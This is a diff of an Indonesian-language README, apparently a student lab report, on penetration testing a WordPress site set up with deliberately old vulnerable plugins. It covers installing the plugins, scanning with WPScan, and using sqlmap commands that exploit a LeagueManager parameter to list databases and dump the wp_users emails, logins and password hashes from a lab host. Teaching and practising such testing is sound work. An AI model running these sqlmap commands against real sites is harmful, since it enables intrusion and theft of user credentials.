@@ -146,13 +146,13 @@ sudo chmod -R 755 /var/www/html/
 24. Masukkan Database name, Database username, Database password dan Database host sesuai dengan yang dibuat sebelumnya
 
 #### C. Instalasi Video Player 1.5.16
-1. Download plugin pada link *https://wordpress.org/plugins/player/advanced/*
+1. Download plugin pada [link](https://wordpress.org/plugins/player/advanced/)
 2. Pada bagian Previous Version, pilih versi **1.5.16**
 3. Klik tombol **Download**
 4. Ekstrak plugin ke /var/www/html/wp-content/plugins dengan perintah `unzip player.1.5.16.zip -d /var/www/html/wp-content/plugins`
 
 #### D. Instalasi LeagueManager 3.9.1.1
-1. Buka link plugin pada *https://wordpress.org/plugins/leaguemanager/advanced/*
+1. Download plugin pada [link](https://wordpress.org/plugins/leaguemanager/advanced/)
 2. Pada bagian Previous Version, pilih versi **3.9.1.1**
 3. Klik tombol **Download**
 4. Ekstrak plugin ke /var/www/html/wp-content/plugins dengan perintah `unzip leaguemanager.3.9.1.1.zip -d /var/www/html/wp-content/plugins`
@@ -165,7 +165,7 @@ sudo chmod -R 755 /var/www/html/
 #### F. Instalasi WPScan dan Sqlmap
 Dikarenakan kami menggunkan Sistem Operasi Kali Linux maka, **tidak perlu** lagi menginstall tools penetrasi karena sudah tersedia didalamnya. Akan tetapi jika anda menggukanan Linux versi yang lain seperti ubuntu, mint, xubuntu dan sejenisnya maka anda harus melalukan instalasi secara manual
 
-Langkah - Langkah Instalasi WPscan
+Langkah - Langkah Instalasi WPScan
 1. Instalasi dependensi menggunakan perintah `sudo apt-get install git libcurl4-openssl-dev libxml2 libxml2-dev libxslt1-dev ruby-dev build-essential libgmp-dev zlib1g-dev`
 2. Clone repository WPScan dari git `git clone https://github.com/wpscanteam/wpscan.git`.
 3. Masuk ke direktori WPScan `cd wpscan`.
@@ -183,14 +183,22 @@ Uji Coba Penetrasi <a name="uji"/>
 #### A. WPScan
 1. Buka terminal lalu ketikkan `wpscan`
 2. Masukkan perintah `wpscan -u 10.151.36.103 --enumerate vp`
-3. Akan muncul hasil dari scanning yang dilakukan seperti berikut
+3. Akan muncul hasil dari scanning yang dilakukan seperti berikut :
 ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/wpscan.png "Result WPScan")
 ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/wpscan2.png "Result WPScan")
 
 #### B. Sqlmap
+Sebelum kita memulai Uji coba Sqlmap, terlebih dahulu kita harus mengisikan database pada leaguemanager
+1. Buka halaman pada browser http://10.151.32.6/wp-admin/admin.php?page=leaguemanager
+2. Tambahkan Nama League, kemudaian klik tombol Add League
+3. Klik League yang sudah dibuat, kemudian tambahkan Seasons, Teams, dan Matches
+4. Berikut ini adalah contoh dari hasil penambahan tersebut
+![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/leaguemanager.png "Result Leaguemanager")
+
+Langkah - Langkah Uji Coba
 1. Buka terminal lalu ketikkan `sqlmap`
 2. Masukkan perintah `sqlmap --url="10.151.32.6/?season=2017&league_id=1" -p --dbs` untuk melihat daftar database apa saja yang ada
-3. Jika berhasil maka akan muncul database apa saja yang tersedia, contohnya seperti berikut
+3. Jika berhasil maka akan muncul database apa saja yang tersedia, contohnya seperti berikut :
 ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/syntax_database.png "Syntax to show database")
 ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/result_database.png "Result database")
 4. Untuk melihat daftar table apa saja yang ada di database **wordpress** masukkan perintah `sqlmap --url="10.151.32.6/?season=2017&league_id=1" -D wordpress --tables`
@@ -199,7 +207,7 @@ Uji Coba Penetrasi <a name="uji"/>
 5. Untuk melihat kolom apa saja yang ada pada **wp_users** masukkan perintah `sqlmap --url="10.151.32.6/?season=2017&league_id=1" -T wp_users --coloumns`
 ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/syntax_coloumn.png "Syntax to show coloumn")
 ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/result_coloumn.png "Result coloumn")
-6. Untuk isi record user_email, user_login, user_pass pada kolom **wp_users** masukkan perintah `sqlmap --url="10.151.32.6/?season=2017&league_id=1" -T wp_users -C user_email,user_login,user_pass`
+6. Untuk mengetahui isi record user_email, user_login, user_pass pada kolom **wp_users** masukkan perintah `sqlmap --url="10.151.32.6/?season=2017&league_id=1" -T wp_users -C user_email,user_login,user_pass`
 ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/syntax_record.png "Syntax to show record")
 ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/result_record.png "Result record")
 
